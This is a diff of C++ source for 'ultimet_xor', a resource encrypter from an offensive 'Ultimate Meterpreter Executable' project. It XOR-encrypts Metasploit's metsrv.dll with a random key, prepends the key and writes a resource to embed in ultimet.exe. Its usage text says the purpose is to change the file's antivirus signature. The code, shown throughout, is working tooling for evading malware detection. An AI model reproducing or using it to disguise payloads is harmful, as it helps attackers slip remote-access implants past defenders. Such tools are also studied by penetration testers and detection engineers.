@@ -1,9 +1,56 @@
 //»”„ «··Â «·—Õ„‰ «·—ÕÌ„
+
+//this file is part of:
+/************************************************
+*					  [ultimet]					*
+*		The Ultimate Meterpreter Executable		*
+*************************************************		
+- @SherifEldeeb
+- http://eldeeb.net
+- Made in Egypt :)
+************************************************/
+/*
+Copyright (c) 2013, Sherif Eldeeb "eldeeb.net"
+All rights reserved.
+
+Redistribution and use in source and binary forms, with or without
+modification, are permitted provided that the following conditions are met: 
+
+1. Redistributions of source code must retain the above copyright notice, this
+list of conditions and the following disclaimer. 
+2. Redistributions in binary form must reproduce the above copyright notice,
+this list of conditions and the following disclaimer in the documentation
+and/or other materials provided with the distribution. 
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
+ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
+ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
+(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
+ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
+(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
+SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+
+The views and conclusions contained in the software and documentation are those
+of the authors and should not be interpreted as representing official policies, 
+either expressed or implied, of the FreeBSD Project.
+*/
 #include <windows.h>
 #include <iostream>
 #include <time.h>
 
 DWORD err = 0;
+
+void print_header()
+{
+	printf("\n\n****************************************************\n");
+	printf(" [+] [ultimet] - The Ultimate Meterpreter Executable\n");
+	printf(" [+] v0.1 pre-alpha\n");
+	printf("****************************************************\n");
+	printf("  -  http://eldeeb.net - @SheriefEldeeb\n\n");
+}
 
 void gen_random(char *s, const int len) { //ripped & modified "added srand()" from http://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
 	static const char alphanum[] =
@@ -105,46 +152,21 @@ DWORD CopyBufferToFile(LPCWSTR szFileName, unsigned char* buffer, int length)
 	return length; 
 }
 
-int AppendEncryptionKey(LPCWSTR szFileName, unsigned char* buffer, int length)
-{
-	//... first we get a handle on the file
-	HANDLE hfile = CreateFile(szFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
-	if (hfile==INVALID_HANDLE_VALUE) //if something went wrong ...
-	{
-		err = GetLastError();
-		wprintf(L"[-] Invalid file handle! CreateFile() returned : %08x\n", err);
-		CloseHandle(hfile);
-		return -1;
-	}
-
-	wprintf(L"[*] Appending encryption key to the end of the file ...\n", szFileName);
-
-	//this is to append to the end of the file
-	OVERLAPPED* overlapped = {0};
-	overlapped->Offset = 0xffffffff;
-	overlapped->OffsetHigh= 0xffffffff;
-
-	if( FALSE == WriteFile(hfile, buffer, length, NULL, overlapped ))
-	{
-		printf("[-] Unable to write to file.\n");
-		CloseHandle(hfile);
-		return -1;
-	}
-	CloseHandle(hfile);
-	return length; 
-}
-
 void usage(void)
 {
+	print_header();
 	printf("invalid number of arguments...\n\n");
-	printf("[*] The inmet ResourceEncrypter [*]\n");
-	printf(" -  This file is part of the inline meterpreter project https://github.com/SherifEldeeb/inmet/\n");
-	printf(" -  it reads a file, XOR-encrypt it using a random 16 byte key,\n -  then prepend the key to the ciphertext for inmet processing\n");
+	printf("[*] The ultimet_xor ResourceEncrypter [*]\n");
+	printf(" -  This file is part of the ultimet project https://github.com/SherifEldeeb/inmet/\n");
+	printf(" -  it reads a file, XOR-encrypt it using a random 16 byte key,\n -  then prepend the key to the ciphertext for ultimet processing\n");
+	printf(" -  The purpose is to change AV signature of metsrv.dll, not hide a message!\n");
 	printf("[*] for more info, please visit http://eldeeb.net/\n \n");
 	printf("Usage:\n");
-	printf("rsourceencrypter.exe <File_to_be_(en-de)crypted> [OPTIONAL: KEY]\n");
-	printf("The output is going to be a file called \"File_to_be_(en-de)crypted.xor\" and \"key.txt\" if no key is given\n");
-	exit (8);
+	printf("ultimet_xor.exe metsrv.dll\n");
+	printf("\n - The output is going to be a file called \"encrypted.rsc\"\n");
+	printf("   you then need to add that file to ultimet.exe as a resource,\n"
+		" - Type has to be \"BINARY\" and ID \"101\"\n");
+	exit (1);
 }
 
 void encrypt(unsigned char *buffer, char *key, int size)
@@ -180,46 +202,36 @@ int wmain(int argc, wchar_t *argv[])
 
 	//Initialize variables... TODO: Error checking!
 	wcscpy_s(in_filename,argv[1]);
-	
-	wcsncat_s(out_filename, in_filename, MAX_PATH);
-	wcsncat_s(out_filename, L".xor", MAX_PATH);
+	GetCurrentDirectory(MAX_PATH, out_filename);
+	wcsncat_s(out_filename, L"\\encrypted.rsc", MAX_PATH);
 
-	if(argv[2])
-	{
-		wprintf(L"[*] Key provided as the third argument, using that to (de/en)crypt...\n");
-			wcscpy_s(temp,argv[2]);
-			//UnicodeToAnsi(encryption_key,temp);
-			wcstombs(encryption_key,temp,wcslen(temp));
-	} else {
-		//Write key to file
-		wprintf(L"[*] No key specified, generating a random 16 character one...\n");
-		gen_random(encryption_key, 16);
-		printf("[*] \"%s\"will be used for encryption, writing key to file...\n", encryption_key);
+	//Write key to file
+	wprintf(L"[*] Generating a random 16 character password...\n");
+	gen_random(encryption_key, 16);
+	printf("[*] \"%s\"will be used for encryption, writing key to file...\n", encryption_key);
 
-		wchar_t keyFileName[MAX_PATH] = {0};
-		GetCurrentDirectory(MAX_PATH, keyFileName);
-		wcsncat_s(keyFileName, L"\\key.txt", (MAX_PATH - strlen((const char*)keyFileName)));
-		HANDLE hfile = CreateFile(keyFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
-		WriteFile(hfile, encryption_key, strlen((const char*)encryption_key), NULL, NULL);
-		CloseHandle(hfile);
-		wprintf(L"[*] Key written to \"%s\", use that to decrypt...\n", keyFileName);
-		//
-
-	}
-
+	wchar_t keyFileName[MAX_PATH] = {0};
+	GetCurrentDirectory(MAX_PATH, keyFileName);
+	wcsncat_s(keyFileName, L"\\key.txt", (MAX_PATH - strlen((const char*)keyFileName)));
+	HANDLE hfile = CreateFile(keyFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
+	WriteFile(hfile, encryption_key, strlen((const char*)encryption_key), NULL, NULL);
+	CloseHandle(hfile);
+	wprintf(L"[*] Key written to \"%s\", use that to decrypt if you want...\n", keyFileName);
 
 	DWORD filesize = CopyFileToBuffer(in_filename, &buffer);
-
+	
+	wprintf(L"[*] XORing ...\n", keyFileName);
 	encrypt(buffer, encryption_key, filesize);
 
-	CopyBufferToFile(out_filename, buffer, filesize);
+	//CopyBufferToFile(out_filename, buffer, filesize);
 
 	// combining both buffers...
 	big_buffer = (unsigned char*)VirtualAlloc(0, (strlen(encryption_key)+filesize+1), MEM_COMMIT, PAGE_READWRITE);
 	memcpy_s(big_buffer,strlen(encryption_key),encryption_key,strlen(encryption_key));
 	memcpy_s((big_buffer + strlen(encryption_key)),filesize , buffer,filesize);
-	
-	CopyBufferToFile(L"e:\\encrypted.rsc", big_buffer, filesize + strlen(encryption_key));
+
+	CopyBufferToFile(out_filename, big_buffer, filesize + strlen(encryption_key));
+	wprintf(L"[*] Done! now you can use any resource editor to add \"encrypted.rsc\" as a resource\n    to ultimet.exe, Type has to be \"BINARY\" and ID \"101\".n");
 
 	printf("%s\n",encryption_key);
 	return 0;
